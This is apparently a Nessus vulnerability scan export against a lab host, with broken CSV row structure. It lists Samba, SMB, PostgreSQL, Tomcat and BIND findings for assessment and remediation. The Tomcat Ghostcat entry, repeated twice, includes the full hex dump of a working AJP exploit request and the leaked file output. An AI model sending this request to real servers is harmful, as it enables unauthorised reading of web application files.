;Plugin ID;CVE;CVSS;Risk;Host;Protocol;Port;Name;Synopsis;Description;Solution;See Also;Plugin Output;STIG Severity;CVSS v3.0 Base Score;CVSS Temporal Score;CVSS v3.0 Temporal Score;Risk Factor;BID;XREF;MSKB;Plugin Publication Date;Plugin Modification Date;Metasploit;Core Impact;CANVAS
3362;"susceptible to any known exploits.""";Enable support for TLS 1.2 and 1.3, and disable support for TLS 1.0.;https://tools.ietf.org/html/draft-ietf-tls-oldversions-deprecate-00;TLSv1 is enabled and the server supports at least one cipher.;;6.5;;;Medium;;;;22/11/2017;31/03/2020;;;;;;;;;;;;
3363;104887;;;None;10.0.2.6;tcp;445;Samba Version;It was possible to obtain the samba version from the remote ;;;;;;;;;;;;;;;;;
3364;"operating system.""";Nessus was able to obtain the samba version from the remote ;;;;;;;;;;;;;;;;;;;;;;;;
3365;operating by sending an authentication request to port 139 or 445. ;;;;;;;;;;;;;;;;;;;;;;;;;
3366;"Note that this plugin requires SMB1 to be enabled on the host.""";;;;;;;;;;;;;;;;;;;;;;;;;
3367;"The remote Samba Version is : Samba 3.0.20-Debian""";;;;;None;;;;30/11/2017;22/11/2019;;;;;;;;;;;;;;;
3368;106716;;;None;10.0.2.6;tcp;445;Microsoft Windows SMB2 and SMB3 Dialects Supported (remote check);It was possible to obtain information about the dialects of SMB2 and SMB3 available;;;;;;;;;;;;;;;;;
3369;"on the remote host.""";Nessus was able to obtain the set of SMB2 and SMB3 dialects running on the remote;;;;;;;;;;;;;;;;;;;;;;;;
3370;"host by sending an authentication request to port 139 or 445.""";;;;;;;;;;;;;;;;;;;;;;;;;
3371;The remote host does NOT support the following SMB dialects :;;;;;;;;;;;;;;;;;;;;;;;;;
3372;	_version_  _introduced in windows version_;;;;;;;;;;;;;;;;;;;;;;;;;
3373;	2.0.2      Windows 2008  ;;;;;;;;;;;;;;;;;;;;;;;;;
3374;	2.1        Windows 7     ;;;;;;;;;;;;;;;;;;;;;;;;;
3375;	2.2.2      Windows 8 Beta;;;;;;;;;;;;;;;;;;;;;;;;;
3376;	2.2.4      Windows 8 Beta;;;;;;;;;;;;;;;;;;;;;;;;;
3377;	3.0        Windows 8     ;;;;;;;;;;;;;;;;;;;;;;;;;
3378;	3.0.2      Windows 8.1   ;;;;;;;;;;;;;;;;;;;;;;;;;
3379;	3.1        Windows 10    ;;;;;;;;;;;;;;;;;;;;;;;;;
3380;	3.1.1      Windows 10    ;;;;;;;;;;;;;;;;;;;;;;;;;
3381;;,;,;"None""";;;;09/02/2018;11/03/2020;;;;;;;;;;;;;;;;;
3382;110723;;;None;10.0.2.6;tcp;0;No Credentials Provided;Nessus was able to find common ports used for local checks,;;;;;;;;;;;;;;;;;
3383;however;" no credentials were provided in the scan policy.""";Nessus was unable to execute credentialed checks because no ;;;;;;;;;;;;;;;;;;;;;;;
3384;"credentials were provided.""";;;SSH was detected on port 22 but no credentials were provided.;;;;;;;;;;;;;;;;;;;;;;
3385;SSH local checks were not enabled.;;;;;;;;;;;;;;;;;;;;;;;;;
3386;;;;;;;;;;;;;;;;;;;;;;;;;;
3387;;,;,;"None""";;;;27/06/2018;02/10/2018;;;;;;;;;;;;;;;;;
3388;117886;;;None;10.0.2.6;tcp;0;Local Checks Not Enabled (info);Local checks were not enabled.;Nessus did not enable local checks on the remote host. This does not;;;;;;;;;;;;;;;;
3389;necessarily indicate a problem with the scan. Credentials may not have;;;;;;;;;;;;;;;;;;;;;;;;;
3390;been provided; local checks may not be available for the target; the;;;;;;;;;;;;;;;;;;;;;;;
3391;target may not have been identified; or another issue may have;;;;;;;;;;;;;;;;;;;;;;;;
3392;occurred that prevented local checks from being enabled. See plugin;;;;;;;;;;;;;;;;;;;;;;;;;
3393;output for details.;;;;;;;;;;;;;;;;;;;;;;;;;
3394;;;;;;;;;;;;;;;;;;;;;;;;;;
3395;This plugin reports informational findings related to local checks not;;;;;;;;;;;;;;;;;;;;;;;;;
3396;being enabled. For failure information; see plugin 21745 :;;;;;;;;;;;;;;;;;;;;;;;;
3397;"'Authentication Failure - Local Checks Not Run'.""";;;;;;;;;;;;;;;;;;;;;;;;;
3398;The following issues were reported :;;;;;;;;;;;;;;;;;;;;;;;;;
3399;;;;;;;;;;;;;;;;;;;;;;;;;;
3400;  - Plugin      : no_local_checks_credentials.nasl;;;;;;;;;;;;;;;;;;;;;;;;;
3401;    Plugin ID   : 110723;;;;;;;;;;;;;;;;;;;;;;;;;
3402;    Plugin Name : No Credentials Provided;;;;;;;;;;;;;;;;;;;;;;;;;
3403;    Message     : ;;;;;;;;;;;;;;;;;;;;;;;;;
3404;Credentials were not provided for detected SSH service.;;;;;;;;;;;;;;;;;;;;;;;;;
3405;;,;,;"None""";;;;02/10/2018;02/11/2018;;;;;;;;;;;;;;;;;
3406;118224;;;None;10.0.2.6;tcp;5432;PostgreSQL STARTTLS Support;The remote service supports encrypting traffic.;The remote PostgreSQL server supports the use of encryption;;;;;;;;;;;;;;;;
3407;initiated during pre-login to switch from a cleartext to an;;;;;;;;;;;;;;;;;;;;;;;;;
3408;"encrypted communications channel.""";;https://www.postgresql.org/docs/9.2/protocol-flow.html#AEN96066;;;;;;;;;;;;;;;;;;;;;;;
3409;"https://www.postgresql.org/docs/9.2/protocol-message-formats.html""";;;;;;;;;;;;;;;;;;;;;;;;;
3410;Here is the PostgreSQL's SSL certificate that Nessus;;;;;;;;;;;;;;;;;;;;;;;;;
3411;was able to collect after sending a pre-login packet :;;;;;;;;;;;;;;;;;;;;;;;;;
3412;;;;;;;;;;;;;;;;;;;;;;;;;;
3413;------------------------------ snip ------------------------------;;;;;;;;;;;;;;;;;;;;;;;;;
3414;Subject Name: ;;;;;;;;;;;;;;;;;;;;;;;;;
3415;;;;;;;;;;;;;;;;;;;;;;;;;;
3416;Country: XX;;;;;;;;;;;;;;;;;;;;;;;;;
3417;State/Province: There is no such thing outside US;;;;;;;;;;;;;;;;;;;;;;;;;
3418;Locality: Everywhere;;;;;;;;;;;;;;;;;;;;;;;;;
3419;Organization: OCOSA;;;;;;;;;;;;;;;;;;;;;;;;;
3420;Organization Unit: Office for Complication of Otherwise Simple Affairs;;;;;;;;;;;;;;;;;;;;;;;;;
3421;Common Name: ubuntu804-base.localdomain;;;;;;;;;;;;;;;;;;;;;;;;;
3422;Email Address: root@ubuntu804-base.localdomain;;;;;;;;;;;;;;;;;;;;;;;;;
3423;;;;;;;;;;;;;;;;;;;;;;;;;;
3424;Issuer Name: ;;;;;;;;;;;;;;;;;;;;;;;;;
3425;;;;;;;;;;;;;;;;;;;;;;;;;;
3426;Country: XX;;;;;;;;;;;;;;;;;;;;;;;;;
3427;State/Province: There is no such thing outside US;;;;;;;;;;;;;;;;;;;;;;;;;
3428;Locality: Everywhere;;;;;;;;;;;;;;;;;;;;;;;;;
3429;Organization: OCOSA;;;;;;;;;;;;;;;;;;;;;;;;;
3430;Organization Unit: Office for Complication of Otherwise Simple Affairs;;;;;;;;;;;;;;;;;;;;;;;;;
3431;Common Name: ubuntu804-base.localdomain;;;;;;;;;;;;;;;;;;;;;;;;;
3432;Email Address: root@ubuntu804-base.localdomain;;;;;;;;;;;;;;;;;;;;;;;;;
3433;;;;;;;;;;;;;;;;;;;;;;;;;;
3434;Serial Number: 00 FA F9 3A 4C 7F B6 B9 CC ;;;;;;;;;;;;;;;;;;;;;;;;;
3435;;;;;;;;;;;;;;;;;;;;;;;;;;
3436;Version: 1;;;;;;;;;;;;;;;;;;;;;;;;;
3437;;;;;;;;;;;;;;;;;;;;;;;;;;
3438;Signature Algorithm: SHA-1 With RSA Encryption;;;;;;;;;;;;;;;;;;;;;;;;;
3439;;;;;;;;;;;;;;;;;;;;;;;;;;
3440;Not Valid Before: Mar 17 14:07:45 2010 GMT;;;;;;;;;;;;;;;;;;;;;;;;;
3441;Not Valid After: Apr 16 14:07:45 2010 GMT;;;;;;;;;;;;;;;;;;;;;;;;;
3442;;;;;;;;;;;;;;;;;;;;;;;;;;
3443;Public Key Info: ;;;;;;;;;;;;;;;;;;;;;;;;;
3444;;;;;;;;;;;;;;;;;;;;;;;;;;
3445;Algorithm: RSA Encryption;;;;;;;;;;;;;;;;;;;;;;;;;
3446;Key Length: 1024 bits;;;;;;;;;;;;;;;;;;;;;;;;;
3447;Public Key: 00 D6 B4 13 36 33 9A 95 71 7B 1B DE 7C 83 75 DA 71 B1 3C A9 ;;;;;;;;;;;;;;;;;;;;;;;;;
3448;            7F FE AD 64 1B 77 E9 4F AE BE CA D4 F8 CB EF AE BB 43 79 24 ;;;;;;;;;;;;;;;;;;;;;;;;;
3449;            73 FF 3C E5 9E 3B 6D FC C8 B1 AC FA 4C 4D 5E 9B 4C 99 54 0B ;;;;;;;;;;;;;;;;;;;;;;;;;
3450;            D7 A8 4A 50 BA A9 DE 1D 1F F4 E4 6B 02 A3 F4 6B 45 CD 4C AF ;;;;;;;;;;;;;;;;;;;;;;;;;
3451;            8D 89 62 33 8F 65 BB 36 61 9F C4 2C 73 C1 4E 2E A0 A8 14 4E ;;;;;;;;;;;;;;;;;;;;;;;;;
3452;            98 70 46 61 BB D1 B9 31 DF 8C 99 EE 75 6B 79 3C 40 A0 AE 97 ;;;;;;;;;;;;;;;;;;;;;;;;;
3453;            00 90 9D DC 99 0D 33 A4 B5 ;;;;;;;;;;;;;;;;;;;;;;;;;
3454;Exponent: 01 00 01 ;;;;;;;;;;;;;;;;;;;;;;;;;
3455;;;;;;;;;;;;;;;;;;;;;;;;;;
3456;Signature Length: 128 bytes / 1024 bits;;;;;;;;;;;;;;;;;;;;;;;;;
3457;Signature: 00 92 A4 B4 B8 14 55 63 25 51 4A 0B C3 2A 22 CF 3A F8 17 6A ;;;;;;;;;;;;;;;;;;;;;;;;;
3458;           0C CF 66 AA A7 65 2F 48 6D CD E3 3E 5C 9F 77 6C D4 44 54 1F ;;;;;;;;;;;;;;;;;;;;;;;;;
3459;           1E 84 4F 8E D4 8D DD AC 2D 88 09 21 A8 DA 56 2C A9 05 3C 49 ;;;;;;;;;;;;;;;;;;;;;;;;;
3460;           68 35 19 75 0C DA 53 23 88 88 19 2D 74 26 C1 22 65 EE 11 68 ;;;;;;;;;;;;;;;;;;;;;;;;;
3461;           83 6A 53 4A 9C 27 CB A0 B4 E9 8D 29 0C B2 3C 18 5C 67 CC 53 ;;;;;;;;;;;;;;;;;;;;;;;;;
3462;           A6 1E 30 D0 AA 26 7B 1E AE 40 B9 29 01 6C 2E BC A2 19 94 7C ;;;;;;;;;;;;;;;;;;;;;;;;;
3463;           15 6E 8D 30 38 F6 CA 2E 75 ;;;;;;;;;;;;;;;;;;;;;;;;;
3464;;;;;;;;;;;;;;;;;;;;;;;;;;
3465;;;;;;;;;;;;;;;;;;;;;;;;;;
3466;------------------------------ snip ------------------------------;;;;;;;;;;;;;;;;;;;;;;;;;
3467;;,;,;"None""";;;;19/10/2018;15/11/2018;;;;;;;;;;;;;;;;;
3468;134862;CVE-2020-1745;7.5;High;10.0.2.6;tcp;8009;Apache Tomcat AJP Connector Request Injection (Ghostcat);There is a vulnerable AJP connector listening on the remote host.;A file read/inclusion vulnerability was found in AJP connector. A;;;;;;;;;;;;;;;;
3469; remote; unauthenticated attacker could exploit this vulnerability to ;;;;;;;;;;;;;;;;;;;;;;;;
3470;read web application files from a vulnerable server. In instances where;;;;;;;;;;;;;;;;;;;;;;;;;
3471;the vulnerable server allows file uploads; an attacker could upload ;;;;;;;;;;;;;;;;;;;;;;;;
3472;malicious JavaServer Pages (JSP) code within a variety of file types ;;;;;;;;;;;;;;;;;;;;;;;;;
3473;"and gain remote code execution (RCE).""";Update the AJP configuration to require authorization and/or upgrade the Tomcat server to 7.0.100, 8.5.51, 9.0.31 or later.;http://www.nessus.org/u?8ebe6246;;;;;;;;;;;;;;;;;;;;;;;
3474;http://www.nessus.org/u?4e287adb;;;;;;;;;;;;;;;;;;;;;;;;;
3475;http://www.nessus.org/u?cbc3d54e;;;;;;;;;;;;;;;;;;;;;;;;;
3476;https://access.redhat.com/security/cve/CVE-2020-1745;;;;;;;;;;;;;;;;;;;;;;;;;
3477;https://access.redhat.com/solutions/4851251;;;;;;;;;;;;;;;;;;;;;;;;;
3478;http://www.nessus.org/u?dd218234;;;;;;;;;;;;;;;;;;;;;;;;;
3479;http://www.nessus.org/u?dd772531;;;;;;;;;;;;;;;;;;;;;;;;;
3480;http://www.nessus.org/u?2a01d6bf;;;;;;;;;;;;;;;;;;;;;;;;;
3481;http://www.nessus.org/u?3b5af27e;;;;;;;;;;;;;;;;;;;;;;;;;
3482;http://www.nessus.org/u?9dab109f;;;;;;;;;;;;;;;;;;;;;;;;;
3483;"http://www.nessus.org/u?5eafcf70""";;;;;;;;;;;;;;;;;;;;;;;;;
3484;Nessus was able to exploit the issue using the following request :;;;;;;;;;;;;;;;;;;;;;;;;;
3485;;;;;;;;;;;;;;;;;;;;;;;;;;
3486;0x0000:  02 02 00 08 48 54 54 50 2F 31 2E 31 00 00 0F 2F    ....HTTP/1.1.../;;;;;;;;;;;;;;;;;;;;;;;;;
3487;0x0010:  61 73 64 66 2F 78 78 78 78 78 2E 6A 73 70 00 00    asdf/xxxxx.jsp..;;;;;;;;;;;;;;;;;;;;;;;;;
3488;0x0020:  09 6C 6F 63 61 6C 68 6F 73 74 00 FF FF 00 09 6C    .localhost.....l;;;;;;;;;;;;;;;;;;;;;;;;;
3489;0x0030:  6F 63 61 6C 68 6F 73 74 00 00 50 00 00 09 A0 06    ocalhost..P.....;;;;;;;;;;;;;;;;;;;;;;;;;
3490;0x0040:  00 0A 6B 65 65 70 2D 61 6C 69 76 65 00 00 0F 41    ..keep-alive...A;;;;;;;;;;;;;;;;;;;;;;;;;
3491;0x0050:  63 63 65 70 74 2D 4C 61 6E 67 75 61 67 65 00 00    ccept-Language..;;;;;;;;;;;;;;;;;;;;;;;;;
3492;0x0060:  0E 65 6E 2D 55 53 2C 65 6E 3B 71 3D 30 2E 35 00    .en-US;en;;;;;;;;;;;;;;;;;;;;;;;;
3493;0x0070:  A0 08 00 01 30 00 00 0F 41 63 63 65 70 74 2D 45    ....0...Accept-E;;;;;;;;;;;;;;;;;;;;;;;;;
3494;0x0080:  6E 63 6F 64 69 6E 67 00 00 13 67 7A 69 70 2C 20    ncoding...gzip; ;;;;;;;;;;;;;;;;;;;;;;;;
3495;0x0090:  64 65 66 6C 61 74 65 2C 20 73 64 63 68 00 00 0D    deflate; sdch...;;;;;;;;;;;;;;;;;;;;;;;;
3496;0x00A0:  43 61 63 68 65 2D 43 6F 6E 74 72 6F 6C 00 00 09    Cache-Control...;;;;;;;;;;;;;;;;;;;;;;;;;
3497;0x00B0:  6D 61 78 2D 61 67 65 3D 30 00 A0 0E 00 07 4D 6F    max-age=0.....Mo;;;;;;;;;;;;;;;;;;;;;;;;;
3498;0x00C0:  7A 69 6C 6C 61 00 00 19 55 70 67 72 61 64 65 2D    zilla...Upgrade-;;;;;;;;;;;;;;;;;;;;;;;;;
3499;0x00D0:  49 6E 73 65 63 75 72 65 2D 52 65 71 75 65 73 74    Insecure-Request;;;;;;;;;;;;;;;;;;;;;;;;;
3500;0x00E0:  73 00 00 01 31 00 A0 01 00 09 74 65 78 74 2F 68    s...1.....text/h;;;;;;;;;;;;;;;;;;;;;;;;;
3501;0x00F0:  74 6D 6C 00 A0 0B 00 09 6C 6F 63 61 6C 68 6F 73    tml.....localhos;;;;;;;;;;;;;;;;;;;;;;;;;
3502;0x0100:  74 00 0A 00 21 6A 61 76 61 78 2E 73 65 72 76 6C    t...!javax.servl;;;;;;;;;;;;;;;;;;;;;;;;;
3503;0x0110:  65 74 2E 69 6E 63 6C 75 64 65 2E 72 65 71 75 65    et.include.reque;;;;;;;;;;;;;;;;;;;;;;;;;
3504;0x0120:  73 74 5F 75 72 69 00 00 01 31 00 0A 00 1F 6A 61    st_uri...1....ja;;;;;;;;;;;;;;;;;;;;;;;;;
3505;0x0130:  76 61 78 2E 73 65 72 76 6C 65 74 2E 69 6E 63 6C    vax.servlet.incl;;;;;;;;;;;;;;;;;;;;;;;;;
3506;0x0140:  75 64 65 2E 70 61 74 68 5F 69 6E 66 6F 00 00 0C    ude.path_info...;;;;;;;;;;;;;;;;;;;;;;;;;
3507;"0x0150:  2F 6D 69 73 73 69 6E 67 2E 74 78 74 00 0A 00 22    /missing.txt...""""";;;;;;;;;;;;;;;;;;;;;;;;;
3508;0x0160:  6A 61 76 61 78 2E 73 65 72 76 6C 65 74 2E 69 6E    javax.servlet.in;;;;;;;;;;;;;;;;;;;;;;;;;
3509;0x0170:  63 6C 75 64 65 2E 73 65 72 76 6C 65 74 5F 70 61    clude.servlet_pa;;;;;;;;;;;;;;;;;;;;;;;;;
3510;0x0180:  74 68 00 00 00 00 FF                               th.....         ;;;;;;;;;;;;;;;;;;;;;;;;;
3511;;;;;;;;;;;;;;;;;;;;;;;;;;
3512;;;;;;;;;;;;;;;;;;;;;;;;;;
3513;;;;;;;;;;;;;;;;;;;;;;;;;;
3514;This produced the following truncated output (limited to 10 lines) :;;;;;;;;;;;;;;;;;;;;;;;;;
3515;------------------------------ snip ------------------------------;;;;;;;;;;;;;;;;;;;;;;;;;
3516;"...<?xml version=""""1.0"""" encoding=""""ISO-8859-1""""?>";;;;;;;;;;;;;;;;;;;;;;;;;
3517;<!--;;;;;;;;;;;;;;;;;;;;;;;;;
3518;Licensed to the Apache Software Foundation (ASF) under one or more;;;;;;;;;;;;;;;;;;;;;;;;;
3519;contributor license agreements.  See the NOTICE file distributed with;;;;;;;;;;;;;;;;;;;;;;;;;
3520;this work for additional information regarding copyright ownership.;;;;;;;;;;;;;;;;;;;;;;;;;
3521;The ASF licenses this file to You under the Apache License; Version 2.0;;;;;;;;;;;;;;;;;;;;;;;;
3522;"(the """"License"""")";;;;;;;;;;;;;;;;;;;;;;;;;
3523;the License.  You may obtain a copy of the License at;;;;;;;;;;;;;;;;;;;;;;;;;
3524;;;;;;;;;;;;;;;;;;;;;;;;;;
3525;http://www.apache.org/licenses/LICENSE-2.0;;;;;;;;;;;;;;;;;;;;;;;;;
3526;[...];;;;;;;;;;;;;;;;;;;;;;;;;
3527;;;;;;;;;;;;;;;;;;;;;;;;;;
3528;------------------------------ snip ------------------------------;;;;;;;;;;;;;;;;;;;;;;;;;
3529;;,9.8;5.9;8.8;High;;;;24/03/2020;12/06/2020;;;;;;;;;;;;;;;;
3530;134862;CVE-2020-1938;7.5;High;10.0.2.6;tcp;8009;Apache Tomcat AJP Connector Request Injection (Ghostcat);There is a vulnerable AJP connector listening on the remote host.;A file read/inclusion vulnerability was found in AJP connector. A;;;;;;;;;;;;;;;;
3531; remote; unauthenticated attacker could exploit this vulnerability to ;;;;;;;;;;;;;;;;;;;;;;;;
3532;read web application files from a vulnerable server. In instances where;;;;;;;;;;;;;;;;;;;;;;;;;
3533;the vulnerable server allows file uploads; an attacker could upload ;;;;;;;;;;;;;;;;;;;;;;;;
3534;malicious JavaServer Pages (JSP) code within a variety of file types ;;;;;;;;;;;;;;;;;;;;;;;;;
3535;"and gain remote code execution (RCE).""";Update the AJP configuration to require authorization and/or upgrade the Tomcat server to 7.0.100, 8.5.51, 9.0.31 or later.;http://www.nessus.org/u?8ebe6246;;;;;;;;;;;;;;;;;;;;;;;
3536;http://www.nessus.org/u?4e287adb;;;;;;;;;;;;;;;;;;;;;;;;;
3537;http://www.nessus.org/u?cbc3d54e;;;;;;;;;;;;;;;;;;;;;;;;;
3538;https://access.redhat.com/security/cve/CVE-2020-1745;;;;;;;;;;;;;;;;;;;;;;;;;
3539;https://access.redhat.com/solutions/4851251;;;;;;;;;;;;;;;;;;;;;;;;;
3540;http://www.nessus.org/u?dd218234;;;;;;;;;;;;;;;;;;;;;;;;;
3541;http://www.nessus.org/u?dd772531;;;;;;;;;;;;;;;;;;;;;;;;;
3542;http://www.nessus.org/u?2a01d6bf;;;;;;;;;;;;;;;;;;;;;;;;;
3543;http://www.nessus.org/u?3b5af27e;;;;;;;;;;;;;;;;;;;;;;;;;
3544;http://www.nessus.org/u?9dab109f;;;;;;;;;;;;;;;;;;;;;;;;;
3545;"http://www.nessus.org/u?5eafcf70""";;;;;;;;;;;;;;;;;;;;;;;;;
3546;Nessus was able to exploit the issue using the following request :;;;;;;;;;;;;;;;;;;;;;;;;;
3547;;;;;;;;;;;;;;;;;;;;;;;;;;
3548;0x0000:  02 02 00 08 48 54 54 50 2F 31 2E 31 00 00 0F 2F    ....HTTP/1.1.../;;;;;;;;;;;;;;;;;;;;;;;;;
3549;0x0010:  61 73 64 66 2F 78 78 78 78 78 2E 6A 73 70 00 00    asdf/xxxxx.jsp..;;;;;;;;;;;;;;;;;;;;;;;;;
3550;0x0020:  09 6C 6F 63 61 6C 68 6F 73 74 00 FF FF 00 09 6C    .localhost.....l;;;;;;;;;;;;;;;;;;;;;;;;;
3551;0x0030:  6F 63 61 6C 68 6F 73 74 00 00 50 00 00 09 A0 06    ocalhost..P.....;;;;;;;;;;;;;;;;;;;;;;;;;
3552;0x0040:  00 0A 6B 65 65 70 2D 61 6C 69 76 65 00 00 0F 41    ..keep-alive...A;;;;;;;;;;;;;;;;;;;;;;;;;
3553;0x0050:  63 63 65 70 74 2D 4C 61 6E 67 75 61 67 65 00 00    ccept-Language..;;;;;;;;;;;;;;;;;;;;;;;;;
3554;0x0060:  0E 65 6E 2D 55 53 2C 65 6E 3B 71 3D 30 2E 35 00    .en-US;en;;;;;;;;;;;;;;;;;;;;;;;;
3555;0x0070:  A0 08 00 01 30 00 00 0F 41 63 63 65 70 74 2D 45    ....0...Accept-E;;;;;;;;;;;;;;;;;;;;;;;;;
3556;0x0080:  6E 63 6F 64 69 6E 67 00 00 13 67 7A 69 70 2C 20    ncoding...gzip; ;;;;;;;;;;;;;;;;;;;;;;;;
3557;0x0090:  64 65 66 6C 61 74 65 2C 20 73 64 63 68 00 00 0D    deflate; sdch...;;;;;;;;;;;;;;;;;;;;;;;;
3558;0x00A0:  43 61 63 68 65 2D 43 6F 6E 74 72 6F 6C 00 00 09    Cache-Control...;;;;;;;;;;;;;;;;;;;;;;;;;
3559;0x00B0:  6D 61 78 2D 61 67 65 3D 30 00 A0 0E 00 07 4D 6F    max-age=0.....Mo;;;;;;;;;;;;;;;;;;;;;;;;;
3560;0x00C0:  7A 69 6C 6C 61 00 00 19 55 70 67 72 61 64 65 2D    zilla...Upgrade-;;;;;;;;;;;;;;;;;;;;;;;;;
3561;0x00D0:  49 6E 73 65 63 75 72 65 2D 52 65 71 75 65 73 74    Insecure-Request;;;;;;;;;;;;;;;;;;;;;;;;;
3562;0x00E0:  73 00 00 01 31 00 A0 01 00 09 74 65 78 74 2F 68    s...1.....text/h;;;;;;;;;;;;;;;;;;;;;;;;;
3563;0x00F0:  74 6D 6C 00 A0 0B 00 09 6C 6F 63 61 6C 68 6F 73    tml.....localhos;;;;;;;;;;;;;;;;;;;;;;;;;
3564;0x0100:  74 00 0A 00 21 6A 61 76 61 78 2E 73 65 72 76 6C    t...!javax.servl;;;;;;;;;;;;;;;;;;;;;;;;;
3565;0x0110:  65 74 2E 69 6E 63 6C 75 64 65 2E 72 65 71 75 65    et.include.reque;;;;;;;;;;;;;;;;;;;;;;;;;
3566;0x0120:  73 74 5F 75 72 69 00 00 01 31 00 0A 00 1F 6A 61    st_uri...1....ja;;;;;;;;;;;;;;;;;;;;;;;;;
3567;0x0130:  76 61 78 2E 73 65 72 76 6C 65 74 2E 69 6E 63 6C    vax.servlet.incl;;;;;;;;;;;;;;;;;;;;;;;;;
3568;0x0140:  75 64 65 2E 70 61 74 68 5F 69 6E 66 6F 00 00 0C    ude.path_info...;;;;;;;;;;;;;;;;;;;;;;;;;
3569;"0x0150:  2F 6D 69 73 73 69 6E 67 2E 74 78 74 00 0A 00 22    /missing.txt...""""";;;;;;;;;;;;;;;;;;;;;;;;;
3570;0x0160:  6A 61 76 61 78 2E 73 65 72 76 6C 65 74 2E 69 6E    javax.servlet.in;;;;;;;;;;;;;;;;;;;;;;;;;
3571;0x0170:  63 6C 75 64 65 2E 73 65 72 76 6C 65 74 5F 70 61    clude.servlet_pa;;;;;;;;;;;;;;;;;;;;;;;;;
3572;0x0180:  74 68 00 00 00 00 FF                               th.....         ;;;;;;;;;;;;;;;;;;;;;;;;;
3573;;;;;;;;;;;;;;;;;;;;;;;;;;
3574;;;;;;;;;;;;;;;;;;;;;;;;;;
3575;;;;;;;;;;;;;;;;;;;;;;;;;;
3576;This produced the following truncated output (limited to 10 lines) :;;;;;;;;;;;;;;;;;;;;;;;;;
3577;------------------------------ snip ------------------------------;;;;;;;;;;;;;;;;;;;;;;;;;
3578;"...<?xml version=""""1.0"""" encoding=""""ISO-8859-1""""?>";;;;;;;;;;;;;;;;;;;;;;;;;
3579;<!--;;;;;;;;;;;;;;;;;;;;;;;;;
3580;Licensed to the Apache Software Foundation (ASF) under one or more;;;;;;;;;;;;;;;;;;;;;;;;;
3581;contributor license agreements.  See the NOTICE file distributed with;;;;;;;;;;;;;;;;;;;;;;;;;
3582;this work for additional information regarding copyright ownership.;;;;;;;;;;;;;;;;;;;;;;;;;
3583;The ASF licenses this file to You under the Apache License; Version 2.0;;;;;;;;;;;;;;;;;;;;;;;;
3584;"(the """"License"""")";;;;;;;;;;;;;;;;;;;;;;;;;
3585;the License.  You may obtain a copy of the License at;;;;;;;;;;;;;;;;;;;;;;;;;
3586;;;;;;;;;;;;;;;;;;;;;;;;;;
3587;http://www.apache.org/licenses/LICENSE-2.0;;;;;;;;;;;;;;;;;;;;;;;;;
3588;[...];;;;;;;;;;;;;;;;;;;;;;;;;
3589;;;;;;;;;;;;;;;;;;;;;;;;;;
3590;------------------------------ snip ------------------------------;;;;;;;;;;;;;;;;;;;;;;;;;
3591;;,9.8;5.9;8.8;High;;;;24/03/2020;12/06/2020;;;;;;;;;;;;;;;;
3592;135860;;;None;10.0.2.6;tcp;445;WMI Not Available;WMI queries could not be made against the remote host.;WMI (Windows Management Instrumentation) is not available on the;;;;;;;;;;;;;;;;
3593;remote host over DCOM. WMI queries are used to gather information;;;;;;;;;;;;;;;;;;;;;;;;;
3594;about the remote host; such as its current state; network interface;;;;;;;;;;;;;;;;;;;;;;;
3595;configuration; etc.;;;;;;;;;;;;;;;;;;;;;;;;
3596;;;;;;;;;;;;;;;;;;;;;;;;;;
3597;Without this information Nessus may not be able to identify installed;;;;;;;;;;;;;;;;;;;;;;;;;
3598;"software or security vunerabilities that exist on the remote host.""";;https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page;Can't connect to the 'root\CIMV2' WMI namespace.;;;;;None;;;;21/04/2020;23/06/2020;;;;;;;;;;;;
3599;136769;CVE-2020-8616;5.0;Medium;10.0.2.6;udp;53;ISC BIND Service Downgrade / Reflected DoS;The remote name server is affected by Service Downgrade / Reflected DoS vulnerabilities.;According to its self-reported version, the instance of ISC BIND 9 running on the remote name server is affected by;;;;;;;;;;;;;;;;
3600;performance downgrade and Reflected DoS vulnerabilities. This is due to BIND DNS not sufficiently limiting the number;;;;;;;;;;;;;;;;;;;;;;;;;
3601;fetches which may be performed while processing a referral response.;;;;;;;;;;;;;;;;;;;;;;;;;
3602;;;;;;;;;;;;;;;;;;;;;;;;;;
3603;An unauthenticated; remote attacker can exploit this to cause degrade the service of the recursive server or to use;;;;;;;;;;;;;;;;;;;;;;;;
3604;"the affected server as a reflector in a reflection attack.""";Upgrade to the ISC BIND version referenced in the vendor advisory.;https://kb.isc.org/docs/cve-2020-8616;;;;;;;;;;;;;;;;;;;;;;;
3605;  Installed version : 9.4.2;;;;;;;;;;;;;;;;;;;;;;;;;
